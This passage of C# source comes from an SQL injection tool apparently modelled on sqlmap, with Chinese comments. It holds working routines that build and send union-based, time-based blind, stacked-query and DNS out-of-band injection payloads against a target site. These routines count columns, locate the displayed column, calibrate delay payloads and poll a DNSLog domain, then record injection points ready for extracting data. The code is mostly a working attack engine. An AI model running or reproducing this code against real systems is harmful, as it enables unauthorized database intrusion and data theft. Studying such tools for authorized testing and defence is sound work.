            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            //报错vector复用：烘焙前预生成取数回显标记并随注入点携带（BuildInjectRecord优先复用），
            //vector分隔符按 起始+分隔/分隔+结束 组合烘焙——vector分隔符本身就是提取标记，
            //取数[QUERY]槽位塞裸表达式，消除vector分隔符+ConcatData双重标记开销（报错回显容量仅~31字符）
            string? emStart = null, emStop = null;
            if (!string.IsNullOrEmpty(inp.VectorTemplate) && inp.VectorTemplate.Contains("[QUERY]", StringComparison.Ordinal))
            {
                (inp.StartMark, inp.EndMark, inp.SplitMark) = Payload.EchoMarkers.Generate();
                emStart = inp.StartMark + inp.SplitMark;
                emStop = inp.SplitMark + inp.EndMark;
            }
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType,
                where, inp.VectorTemplate, ph, true, emStart, emStop);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            Log.Success("存在报错注入payload：" + payload);
            return inp;
        }

        /// <summary>
        /// Union查询：递增列数定位（字符填充看回显/NULL填充看相似度+列数+1反证），再逐列定位显示位
        /// unionExtend=已有其他技术信号（sqlmap unionExtended同款）：列范围翻倍扩展（11-20→21-40……），覆盖大列数目标
        /// </summary>
        private static async Task<InjectPoint?> TryUnion(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, bool unionExtend = false)
        {
            //列数范围：用例指定则用之，否则默认1-10
            int colStart = 1;
            int colStop = 10;
            Match mcol = Regex.Match(test.RequestColumns ?? "", @"(\d+)\s*-\s*(\d+)");
            if (mcol.Success)
            {
                colStart = int.Parse(mcol.Groups[1].Value);
                colStop = int.Parse(mcol.Groups[2].Value);
            }
            if (unionExtend)
            {
                //sqlmap扩展规则：上限一律翻倍（1-10→1-20），下限>1时按2*(n-1)+1扩展（11→21），
                //五档范围扩展后恰好连续覆盖1-100列无缺口
                colStop = 2 * colStop;
                if (colStart > 1)
                {
                    colStart = 2 * (colStart - 1) + 1;
                }
            }
            colStop = Math.Min(colStop, unionExtend ? 100 : 50);

            //无信号短路：同边界（原始模板键，与随机渲染无关）此前全列扫描已证明SQL未被执行，
            //其余字符/列范围/注释用例结论相同，直接跳过（22个用例共享同一探测矩阵，不重复发包）。
            //键不含注释符/where：无信号=参数根本未进SQL解析器，换注释符（--/#//*）或where语义不可能改变"未执行"的结论，
            //若带注释符进键，同一边界下12个不同注释用例会各自重跑一遍全列扫描，短路形同虚设
            string missKey = UnionMissKey(boundary);
            if (ctx.UnionNoSignal.Contains(missKey))
            {
                return null;
            }
            PayloadPlaceholder ph = new PayloadPlaceholder();
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string? charExpr = ResolveUnionChar(test, ph);
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix));
            //FROM兜底变体（指纹命中库优先，其后依次尝试无FROM/DUAL/SYSDUMMY1/VALUES）：
            //指纹未命中时Oracle/DB2/HSQLDB等严格库也能通过变体复测检出，不再漏检
            string fromPrimary = ctx.DbCandidates.Any(d => d == DBType.Oracle || d == DBType.DM) ? " FROM DUAL"
                : ctx.DbCandidates.Any(d => d == DBType.HSQLDB) ? " FROM (VALUES(0))"
                : ctx.DbCandidates.Any(d => d == DBType.DB2) ? " FROM SYSIBM.SYSDUMMY1" : "";
            List<string> fromVariants = new List<string> { fromPrimary };
            foreach (string v in new[] { "", " FROM DUAL", " FROM SYSIBM.SYSDUMMY1", " FROM (VALUES(0))" })
            {
                if (!fromVariants.Contains(v))
                {
                    fromVariants.Add(v);
                }
            }

            //1. 定位列数
            bool dbg = Environment.GetEnvironmentVariable("SQLI_DEBUG_UNION") == "1";
            int foundCount = -1;
            //null=列数来自ORDER BY路径（FROM未定）；非null=填充路径确定的FROM变体
            string? usedFrom = null;
            //1a. ORDER BY路径（仅where=1追加语义，优先路径）：
            //原查询上二分列号探针：ORDER BY mid保持模板态=mid列有效（lo=mid），报错/页面剧变=超出列数（hi=mid-1），
            //收敛后lo即列数。ORDER BY列位置语义天然单调（c<=N成功、c>N失败），二分安全；
            //发包量O(log n)：20列上限从最多20包降到5包。判定语义（错误页/相似度）与线性版完全一致
            if (where == 1)
            {
                //ORDER BY列号探针：保持模板态=列有效，报错/页面剧变=超出列数
                async Task<bool> OrderByFails(int c)
                {
                    string oPayload = " ORDER BY " + c + comment;
                    HttpResponse oResp = await Send(ctx, reqTxt, oPayload).ConfigureAwait(false);
                    bool oFail = ConstData.ErrorHttpCode.Contains(oResp.StatusCode) || InjectTools.IsDbErrorPage(oResp.BodyTxt);
                    if (!oFail)
                    {
                        string oTxt = Clear(ctx, oResp.BodyTxt, ReflectionValue(prefix, oPayload, suffix));
                        oFail = PageLikeTool.CalculateSimilarity(ctx.Template, oTxt) < DetectTuning.UnionBound;
                    }
                    return oFail;
                }
                int lo = 0, hi = colStop;
                while (lo < hi)
                {
                    ctx.Config.CheckStop();
                    int mid = (lo + hi + 1) / 2;
                    if (await OrderByFails(mid).ConfigureAwait(false))
                    {
                        hi = mid - 1;
                    }
                    else
                    {
                        lo = mid;
                    }
                }
                if (lo > 0 && lo < colStop)
                {
                    foundCount = lo;
                    Log.Show("ORDER BY路径定位列数=" + foundCount + "（二分探测）");
                }
                else if (lo == colStop)
                {
                    //二分全程未见失败：列数>=colStop，无法区分"恰好等于"与"超出上限"，
                    //补一包探colStop+1：失败=恰好colStop列，成功=超出上限，回退NULL填充路径定列数
                    ctx.Config.CheckStop();
                    if (await OrderByFails(colStop + 1).ConfigureAwait(false))
                    {
                        foundCount = colStop;
                        Log.Show("ORDER BY路径定位列数=" + foundCount + "（二分探测，上限确认）");
                    }
                    else
                    {
                        Log.Show("ORDER BY探测至" + colStop + "列仍未报错，列数超出当前范围，转NULL填充路径！");
                    }
                }
            }
            //1b. NULL/字符填充路径：ORDER BY不可用或未分出胜负时，按FROM变体逐个尝试
            if (foundCount < 0)
            {
                foreach (string fromDual in fromVariants)
                {
                    (foundCount, bool sawError) = await ProbeUnionColumns(ctx, reqTxt, charExpr, comment, fromDual, prefix, suffix, colStart, colStop, dbg).ConfigureAwait(false);
                    if (foundCount > 0)
                    {
                        usedFrom = fromDual;
                        break;
                    }
                    if (!sawError)
                    {
                        //整个FROM变体全列扫描无任何SQL执行信号（无DB错误页、无列数命中）：
                        //参数在此边界不可注入（或错误完全被抑制且页面无差异，Union本就不可用），
                        //其余FROM变体/字符/列范围结论相同——缓存短路，同边界后续用例不再重复发包
                        ctx.UnionNoSignal.Add(missKey);
                        Log.Show("Union探测：该边界全列扫描无SQL执行信号，判定此边界不可注入，同边界后续用例短路！");
                        return null;
                    }
                    //见过DB错误：可能是严格FROM库（Oracle缺FROM全报错），继续尝试下一FROM变体
                }
            }
            if (foundCount < 0)
            {
                return null;
            }

            //2. 逐列定位显示位：单列替换为随机字符串，其余NULL（按FROM变体逐个尝试，ORDER BY路径拿到的列数不含FROM信息）
            int showCol = -1;
            string showFrom = usedFrom ?? fromVariants[0];
            foreach (string fromDual in (usedFrom != null ? new List<string> { usedFrom } : fromVariants))
            {
                showCol = await ProbeUnionShowColumn(ctx, reqTxt, comment, fromDual, prefix, suffix, foundCount, where).ConfigureAwait(false);
                if (showCol > 0)
                {
                    showFrom = fromDual;
                    break;
                }
            }
            if (showCol < 0)
            {
                Log.Show("Union列数=" + foundCount + "但未找到可见显示位，跳过此边界！");
                return null;
            }

            //3. partial union识别（sqlmap multipleUnions/limited rows同款）：双探针确认——
            //两个不同随机串分放两段UNION，仅第一段出现=目标只输出首行/行数受限，Union取数不完整，明确告警
            if (await CheckUnionPartial(ctx, reqTxt, comment, showFrom, prefix, suffix, foundCount, showCol).ConfigureAwait(false))
            {
                Log.Warning("目标疑似partial union（仅输出首行或行数受限），Union取数可能不完整，建议改用报错/盲注通道取数！");
            }

            Log.Warning("发现Union注入！用例：" + test.Title + "，列数=" + foundCount + "，显示位=" + showCol);
            InjectPayloadManager.RecordHit(test);
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Union;
            inp.DBType = ResolveDb(test, ctx);
            inp.SumColumnCount = foundCount;
            inp.ShowColumnIndex = showCol;
            inp.Where = where;
            inp.VectorTemplate = HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, " UNION ALL SELECT "), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            return inp;
        }

        /// <summary>
        /// Union列数定位（NULL/字符填充路径）：递增列数发送Union探针，
        /// 字符填充看回显、NULL填充看相似度+列数+1反证；返回列数，未定位返回-1
        /// </summary>
        private static async Task<(int count, bool sawError)> ProbeUnionColumns(Ctx ctx, string reqTxt, string? charExpr, string comment,
            string fromDual, string prefix, string suffix, int colStart, int colStop, bool dbg)
        {
            bool sawError = false;
            for (int c = colStart; c <= colStop; c++)
            {
                ctx.Config.CheckStop();
                string payload = " UNION ALL SELECT " + string.Join(",", Enumerable.Range(1, c).Select(_ => charExpr)) + fromDual + comment;
                HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (ConstData.ErrorHttpCode.Contains(resp.StatusCode) || InjectTools.IsDbErrorPage(resp.BodyTxt))
                {
                    sawError = true;
                    //错误页（含DB错误指纹）跳过：错误消息中的截断SQL反射会残留探针串导致误判
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union列数探测 c={c} from='{fromDual}' 被判错误页跳过 状态={resp.StatusCode}");
                    }
                    continue;
                }
                string txt = Clear(ctx, resp.BodyTxt, ReflectionValue(prefix, payload, suffix));
                bool hit;
                if (charExpr != null && charExpr.StartsWith('\''))
                {
                    //字符填充：列数正确时填充字符串会出现在查询结果中（已剔除payload回显）
                    hit = txt.Contains(charExpr.Trim('\''), StringComparison.Ordinal);
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union字符填充 c={c} from='{fromDual}' hit={hit} txtLen={txt?.Length} 状态={resp.StatusCode}");
                    }
                }
                else
                {
                    double ratio = PageLikeTool.CalculateSimilarity(ctx.Template, txt);
                    hit = ratio >= DetectTuning.UnionBound;
                    if (dbg)
                    {
                        Log.Show($"[DBG] Union列数探测 c={c} from='{fromDual}' ratio={ratio:F4} tplLen={ctx.Template?.Length} txtLen={txt?.Length}");
                    }
                    if (hit)
                    {
                        //列数+1反证：必须不再匹配，否则页面无法区分列数（可能错误被抑制），放弃此边界
                        string payloadNext = " UNION ALL SELECT " + string.Join(",", Enumerable.Range(1, c + 1).Select(_ => charExpr)) + fromDual + comment;
                        HttpResponse respNext = await Send(ctx, reqTxt, payloadNext).ConfigureAwait(false);
                        string txtNext = Clear(ctx, respNext.BodyTxt, ReflectionValue(prefix, payloadNext, suffix));
                        double ratioNext = PageLikeTool.CalculateSimilarity(ctx.Template, txtNext);
                        if (ratioNext >= DetectTuning.UnionBound)
                        {
                            return (-1, sawError);
                        }
                    }
                }
                if (hit)
                {
                    return (c, sawError);
                }
            }
            return (-1, sawError);
        }

        /// <summary>
        /// Union显示位定位：单列替换为随机字符串，其余NULL。
        /// probe用40字符长串：避免短文本列（varchar(20)等）截断数据时误选为显示位。
        /// 全NULL基准页：PG等严格类型库中文本probe落到数字列会报错，
        /// 错误消息含probe反射，仅判断probe出现会误判；要求页面与全NULL基准相似才认定该列真实可见
        /// </summary>
        private static async Task<int> ProbeUnionShowColumn(Ctx ctx, string reqTxt, string comment,
            string fromDual, string prefix, string suffix, int foundCount, int where)
        {
            string probe = MyTools.RandStr(40).ToLower();
            //显示位判定回归sqlmap原版方案（无独立对照请求）：
            //1. 每个探针响应先Clear剥除真实发送的union payload反射（含URL/HTML编码形态），再搜probe——
            //   纯参数反射站的反射被剥→probe消失→天然不误报；
            //2. DBMS错误页直接跳过（IsDbErrorPage）——错误消息near '...'截断反射可能残留probe片段；
            //3. 靶场/调试页回显的完整执行SQL同样被剥→只认查询结果中的probe。
            //曾加过"probe直接作参数值"的对照请求，因其单段payload模糊剥除不启用、
            //错误消息&#39;probe&#39;截断反射剥不掉，导致全量误杀显示位定位，已移除。
            string nullCols = string.Join(",", Enumerable.Repeat("NULL", foundCount));
            string nullPayload = " UNION ALL SELECT " + nullCols + fromDual + comment;
            HttpResponse nullResp = await Send(ctx, reqTxt, nullPayload).ConfigureAwait(false);
            if (ConstData.ErrorHttpCode.Contains(nullResp.StatusCode) || InjectTools.IsDbErrorPage(nullResp.BodyTxt))
            {
                return -1;
            }
            string nullTxt = Clear(ctx, nullResp.BodyTxt, ReflectionValue(prefix, nullPayload, suffix));
            for (int i = 1; i <= foundCount; i++)
            {
                ctx.Config.CheckStop();
                string cols = string.Join(",", Enumerable.Range(1, foundCount).Select(x => x == i ? "'" + probe + "'" : "NULL"));
                string payload = " UNION ALL SELECT " + cols + fromDual + comment;
                HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (ConstData.ErrorHttpCode.Contains(resp.StatusCode) || InjectTools.IsDbErrorPage(resp.BodyTxt))
                {
                    continue;
                }
                string txt = Clear(ctx, resp.BodyTxt, ReflectionValue(prefix, payload, suffix));
                double ratioToNull = PageLikeTool.CalculateSimilarity(nullTxt, txt);
                //小页面（全NULL基准<512字节）相似度比对失真：40字符probe占比过大必然低于阈值，
                //放宽为probe出现+错误页已排除+基准页不含probe（防错误反射误判）
                bool smallPage = (nullTxt?.Length ?? 0) < 512;
                if (txt.Contains(probe, StringComparison.Ordinal) && (ratioToNull >= DetectTuning.UnionBound || (smallPage && !(nullTxt?.Contains(probe, StringComparison.Ordinal) ?? false))))
                {
                    return i;
                }
            }
            return -1;
        }

        /// <summary>
        /// partial union识别（sqlmap multipleUnions/limited rows同款）：显示位放两个不同随机串分两段UNION发送，
        /// 仅第一段出现=目标只输出首行或行数受限（partial），Union取数会不完整。
        /// 两段都出现=完整union；都未出现=显示位存疑但不据此否决（显示位已经反射对照+基准相似度验证）。
        /// </summary>
        private static async Task<bool> CheckUnionPartial(Ctx ctx, string reqTxt, string comment,
            string fromDual, string prefix, string suffix, int foundCount, int showCol)
        {
            try
            {
                string probe1 = MyTools.RandStr(20).ToLower();
                string probe2 = MyTools.RandStr(20).ToLower();
                string cols1 = string.Join(",", Enumerable.Range(1, foundCount).Select(x => x == showCol ? "'" + probe1 + "'" : "NULL"));
                string cols2 = string.Join(",", Enumerable.Range(1, foundCount).Select(x => x == showCol ? "'" + probe2 + "'" : "NULL"));
                string payload = " UNION ALL SELECT " + cols1 + fromDual + " UNION ALL SELECT " + cols2 + fromDual + comment;
                HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (ConstData.ErrorHttpCode.Contains(resp.StatusCode) || InjectTools.IsDbErrorPage(resp.BodyTxt))
                {
                    return false;
                }
                string txt = InjectTools.StripPayloadReflection(resp.BodyTxt ?? "", ReflectionValue(prefix, payload, suffix));
                bool has1 = txt.Contains(probe1, StringComparison.Ordinal);
                bool has2 = txt.Contains(probe2, StringComparison.Ordinal);
                return has1 && !has2;
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 时间盲注/堆叠查询：三次确认（基准延时→变时复测→零延时对照），多轮确认逻辑
        /// </summary>
        private static async Task<InjectPoint?> TryTime(Ctx ctx, PayloadTest test, PayloadBoundary boundary, int where, bool stacked)
        {
            int baseSec = await EnsureBaseSec(ctx).ConfigureAwait(false);
            int time = Math.Max(1, baseSec + 1);
            if (ctx.Config.TimeOut < time + 3)
            {
                ctx.Config.TimeOut = time + 5;
            }
            bool canSetTime = (test.RequestPayload ?? "").Contains("[SLEEPTIME]", StringComparison.Ordinal);
            //重查询类payload（RANDOMBLOB/BENCHMARK/GENERATE_SERIES等CPU消耗型）：[SLEEPTIME]是放大倍数而非真实秒数，
            //单位实际耗时取决于目标硬件（实测RANDOMBLOB约0.2秒/单位），不校准会因基准延时不达标整体漏报。
            //以[SLEEPTIME]=1实测单位耗时后按目标延时等比放大（sqlmap同款校准思路），结果按重查询函数类型缓存到ctx。
            double heavyUnitMs = -1;
            string? heavyKey = canSetTime ? GetHeavyQueryKey(test.RequestPayload) : null;
            if (heavyKey != null)
            {
                heavyUnitMs = await CalibrateHeavyUnitMs(ctx, test, boundary, where, heavyKey).ConfigureAwait(false);
            }
            //缩放条件仅设下限（>50ms才值得缩放）：单位耗时>=950ms时不缩放会导致t个单位实际延时<t秒（如0.93s/单位×2秒=1.86s不达标漏报），
            //等比放大ceil(t*1000/unitMs)在任何单位耗时下都能保证实际延时>=t秒；零延时对照t=0时ceil(0)=0天然不受影响。
            int ScaleSleep(int t) => heavyUnitMs > 50 ? Math.Min(100, (int)Math.Ceiling(t * 1000.0 / heavyUnitMs)) : t;
            PayloadPlaceholder ph = new PayloadPlaceholder(ScaleSleep(time));
            string prefix = Rep(ctx, ph, boundary.Prefix);
            string suffix = Rep(ctx, ph, boundary.Suffix);
            string comment = Rep(ctx, ph, test.RequestComment);
            string payload = Rep(ctx, ph, test.RequestPayload) + comment;
            string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));

            //第1次：基准延时（重查询payload校准可能因目标CPU实时频率波动失准，欠延时/超时时按实测耗时修正系数自适应重试一次）
            HttpResponse resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            for (int adapt = 0; adapt < 2 && heavyKey != null; adapt++)
            {
                bool underShot = resp.RunTime < time * 1000 - MyTools.deviation;
                bool overShot = resp.RunTime >= ctx.Config.TimeOut * 1000L;
                if (!underShot && !overShot)
                {
                    break;
                }
                //payload确实产生了延时效果（明显慢于基线）才修正：纯快速失败说明注入未生效，重试无意义
                if (resp.RunTime <= ctx.BaseSec * 1000 + MyTools.deviation)
                {
                    return null;
                }
                int sentUnits = ScaleSleep(time);
                double measured = resp.RunTime / (double)Math.Max(1, sentUnits);
                if (measured <= 50 || Math.Abs(measured - heavyUnitMs) < 50)
                {
                    return null;
                }
                ctx.HeavyUnitMs[heavyKey] = measured;
                heavyUnitMs = measured;
                Log.Show("重查询payload实际延时与校准偏差较大（实测约" + (int)measured + "毫秒/单位），按实测修正后重试……");
                ph = new PayloadPlaceholder(ScaleSleep(time));
                prefix = Rep(ctx, ph, boundary.Prefix);
                suffix = Rep(ctx, ph, boundary.Suffix);
                payload = Rep(ctx, ph, test.RequestPayload) + Rep(ctx, ph, test.RequestComment);
                reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
                resp = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
            }
            if (resp.RunTime < time * 1000 - MyTools.deviation || resp.RunTime >= ctx.Config.TimeOut * 1000L)
            {
                return null;
            }
            //第2次：变时复测，响应时间应同步变长（证明延时受控而非网络抖动）
            bool confirm2;
            if (canSetTime)
            {
                int time2 = time + 2;
                PayloadPlaceholder ph2 = new PayloadPlaceholder(ScaleSleep(time2));
                string prefix2 = Rep(ctx, ph2, boundary.Prefix);
                string suffix2 = Rep(ctx, ph2, boundary.Suffix);
                string payload2 = Rep(ctx, ph2, test.RequestPayload) + Rep(ctx, ph2, test.RequestComment);
                string reqTxt2 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload2), prefix2, suffix2));
                HttpResponse resp2 = await Send(ctx, reqTxt2, payload2).ConfigureAwait(false);
                confirm2 = resp2.RunTime > time2 * 1000 - MyTools.deviation;
            }
            else
            {
                HttpResponse resp2 = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                confirm2 = resp2.RunTime > time * 1000 - MyTools.deviation;
            }
            if (!confirm2)
            {
                return null;
            }
            //基线抖动大：追加一轮基准延时确认，排除慢响应是网络抖动造成（高延迟目标的重复确认）
            if (ctx.BaseJitterMs > 1000)
            {
                HttpResponse respX = await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                if (respX.RunTime < time * 1000 - MyTools.deviation)
                {
                    Log.Show("基线抖动大且追加确认未达标，判定为误报，跳过此payload！");
                    return null;
                }
            }
            //第3次：零延时对照，响应应快速返回（证明延时确实由payload引起）
            HttpResponse? resp0 = null;
            if (canSetTime)
            {
                PayloadPlaceholder ph0 = new PayloadPlaceholder(0);
                string prefix0 = Rep(ctx, ph0, boundary.Prefix);
                string suffix0 = Rep(ctx, ph0, boundary.Suffix);
                string payload0 = Rep(ctx, ph0, test.RequestPayload) + Rep(ctx, ph0, test.RequestComment);
                string reqTxt0 = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload0), prefix0, suffix0));
                resp0 = await Send(ctx, reqTxt0, payload0).ConfigureAwait(false);
                if (resp0.RunTime > time * 1000 - MyTools.deviation)
                {
                    Log.Show("零延时对照响应仍然缓慢，判定为误报，跳过此payload！");
                    return null;
                }
            }

            string techName = stacked ? "堆叠查询" : "时间盲注";
            Log.Warning("发现" + techName + "注入！用例：" + test.Title + "，延时=" + time + "秒");
            InjectPayloadManager.RecordHit(test);
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            //堆叠命中单独标记Stacked类型：取数回退时间盲注（BoolInjectType.Time已携带），写操作/命令执行走堆叠直发；
            //纯时间盲注命中标记独立的InjectType.Time（BoolInjectType.Time保留作oracle信息，判定经EffectiveBoolType强制走时间）
            inp.InjectType = stacked ? InjectType.Stacked : InjectType.Time;
            inp.BoolInjectType = BoolInjectType.Time;
            inp.CheckValue = time.ToString();
            inp.DBType = ResolveDb(test, ctx);
            inp.TestPayload = payload;
            inp.Where = where;
            //堆叠记录不启用vector模式：写操作/命令执行的堆叠直发与取数回退时间盲注均依赖and胶水标记
            inp.VectorTemplate = !stacked && HasVectorSlot(test.Vector) ? test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : prefix + " and ";
            inp.Prefix = prefix; inp.Suffix = suffix;
            inp.Clause = string.Join(",", boundary.Clause);
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix, inp.DBType, where, inp.VectorTemplate, ph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            //防脏数据校验基线：时间通道真值=延时响应码、假值=零延时对照码（无对照时与真值同码）
            inp.TrueCode = resp.StatusCode;
            inp.FalseCode = resp0 != null ? resp0.StatusCode : resp.StatusCode;
            Log.Success("存在" + techName + "payload：" + payload);
            return inp;
        }

        /// <summary>
        /// DNS外带探测（本工具扩展能力）：每条用例携带唯一token（payload中injectstr.domain占位符
        /// 替换为 token.DNSLog域名），全部发完后统一轮询DNSLog平台，回收到token解析记录即确认注入。
        /// 不依赖页面响应与延时，可发现无回显无延时的盲注点；需开启"DNS外带探测"开关且配置DNSLog域名+API Token。
        /// </summary>
        private static async Task<InjectPoint?> TryDnsOob(Ctx ctx, int level, int risk, DetectSessionState? session = null)
        {
            string domain = ctx.Config.DataConfig.DnsLogDomain?.Trim ()?? "";
            string apiToken = ctx.Config.DataConfig.DnsLogApiToken?.Trim ()?? "";
            if (string.IsNullOrEmpty(domain) || string.IsNullOrEmpty(apiToken))
            {
                Log.Warning("DNS外带探测已开启，但未配置DNSLog域名或API Token（网络设置→DNS数据接收），跳过DNS外带探测！");
                return null;
            }
            List<PayloadTest> tests = InjectPayloadLoader.GetDnsTests(level, risk)
                .OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
            //extendTests（与主循环同款）：已识别库的DNS专属用例不受level/risk上限裁剪
            if (ctx.DbCandidates.Count > 0)
            {
                List<PayloadTest> dnsExtended = InjectPayloadLoader.GetDnsTests(5, 3)
                    .Where(t => (t.Level > level || t.Risk > risk) && ExtendMatch(t, ctx.DbCandidates))
                    .ToList();
                if (dnsExtended.Count > 0)
                {
                    tests.AddRange(dnsExtended);
                    tests = tests.OrderBy(t => t.Level).ThenBy(t => t.Risk).ToList();
                    Log.Show("已识别数据库（" + string.Join(",", ctx.DbCandidates) + "），DNS外带追加该库专属高Level/Risk用例" + dnsExtended.Count + "个（extendTests）！");
                }
            }
            if (tests.Count == 0)
            {
                return null;
            }
            Log.Show("正在进行DNS外带探测检测（" + tests.Count + "个用例，域名=" + domain + "）……");
            //先全部发出（每条携带唯一token），再统一轮询，避免逐条等待平台回收
            var pending = new List<(string token, PayloadTest test, int where, string prefix, string suffix, string payload, string clause)>();
            var tokenSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            foreach (PayloadTest test in tests)
            {
                ctx.Config.CheckStop();
                if (!DbmsMatch(test, ctx.DbCandidates))
                {
                    continue;
                }
                //DNS外带在主循环之后：数字值两轮ptype已走完，显式取全集（数字+引号类边界都尝试）
                int[] dnsPtypes = ctx.NumericValue ? new[] { 1, 2, 3, 4, 5, 8 } : ctx.Ptypes;
                int effLevel = ExtendMatch(test, ctx.DbCandidates) ? 5 : level;
                foreach (PayloadBoundary boundary in OrderBoundaries(session, MatchBoundaries(test, effLevel, dnsPtypes)))
                {
                    ctx.Config.CheckStop();
                    //与主循环一致的命中后boundary裁剪
                    if (ctx.KnownBoundary != null && !ReferenceEquals(boundary, ctx.KnownBoundary))
                    {
                        continue;
                    }
                    foreach (int where in test.Where)
                    {
                        if (!boundary.Where.Contains(where))
                        {
                            continue;
                        }
                        string token = MyTools.RandStr(6).ToLower();
                        if (!tokenSet.Add(token))
                        {
                            continue;
                        }
                        PayloadPlaceholder ph = new PayloadPlaceholder();
                        string prefix = Rep(ctx, ph, boundary.Prefix);
                        string suffix = Rep(ctx, ph, boundary.Suffix);
                        //injectstr.domain为dns_blind.xml占位符：injectstr→唯一token，domain→配置的DNSLog域名
                        string payload = (Rep(ctx, ph, test.RequestPayload) + Rep(ctx, ph, test.RequestComment))
                            .Replace("injectstr.domain", token + "." + domain, StringComparison.Ordinal);
                        string reqTxt = BuildRequest(ctx, MarkedValue(ctx, BaseValue(ctx, where, payload), prefix, suffix));
                        await Send(ctx, reqTxt, payload).ConfigureAwait(false);
                        pending.Add((token, test, where, prefix, suffix, payload, string.Join(",", boundary.Clause)));
                        Log.Show("DNS外带探测已发送：" + test.Title + "（等待解析 " + token + "." + domain + "）");
                    }
                }
            }
            if (pending.Count == 0)
            {
                return null;
            }
            Log.Show("DNS外带探测payload已全部发出，开始轮询DNSLog平台回收解析记录（最长25秒）……");
            HashSet<string> hitTokens = await DnsExfilTool.PollDnsLogForTokens(ctx.Config, tokenSet, 25).ConfigureAwait(false);
            if (hitTokens.Count == 0)
            {
                Log.Show("DNS外带探测未回收到任何解析记录（目标不出网/用例不适用/平台延迟），未命中！");
                return null;
            }
            var hit = pending.First(p => hitTokens.Contains(p.token));
            Log.Warning("发现DNS外带注入！用例：" + hit.test.Title + "，token=" + hit.token + " 已在DNSLog平台回收到解析记录");
            InjectPayloadManager.RecordHit(hit.test);
            PayloadPlaceholder eph = new PayloadPlaceholder();
            InjectPoint inp = new InjectPoint();
            inp.IsInject = true;
            inp.InjectType = InjectType.Dns;
            //DNS外带取数本身不经页面判断；BoolInjectType仅作oracle信息占位，判断值由取数前"查找判断值"补齐
            inp.BoolInjectType = BoolInjectType.KeyWord;
            inp.CheckValue = "";
            inp.DBType = ResolveDb(hit.test, ctx);
            inp.TestPayload = hit.payload;
            inp.Where = hit.where;
            inp.VectorTemplate = HasVectorSlot(hit.test.Vector) ? hit.test.Vector : "";
            inp.OrigValue = ctx.PValue ?? "";
            inp.UnionStartPayLoad = hit.where == 3 && !string.IsNullOrEmpty(inp.VectorTemplate) ? "" : hit.prefix + " and ";
            inp.Prefix = hit.prefix; inp.Suffix = hit.suffix;
            inp.Clause = hit.clause;
            inp.PValue = ExploitMarkedValue(ctx, BaseValue(ctx, hit.where, hit.payload), hit.prefix, hit.suffix, inp.DBType, hit.where, inp.VectorTemplate, eph);
            inp.RequestTxt = BuildRequest(ctx, inp.PValue);
            inp.PName = ctx.PName;
            inp.Place = ctx.Place;
            inp.UriIndex = ctx.UriIndex;
            inp.HeaderName = ctx.HeaderName;
            Log.Success("存在DNS外带payload：" + hit.payload);
            Log.Warning("DNS外带记录未携带判断值：取数前请在数据操作页用“查找判断值”配置该点判断值（或确保目标持续出网走DNS外带取数）！");
            return inp;
        }

        /// <summary>
        /// 基线响应时间（取最大向上取整到秒，并记录抖动），时间类检测前惰性计算。
        /// 样本池复用：优先用前奏串行段样本（模板/原页等原始请求，干净）；不足3个混入并发段样本；
        /// 仍不足才补发原始请求到3个（理论边缘兜底）。基线高告警、抖动大时TryTime增加一轮确认（判定语义不变）
        /// </summary>
        private static async Task<int> EnsureBaseSec(Ctx ctx)
        {
            if (ctx.BaseSec >= 0)
            {
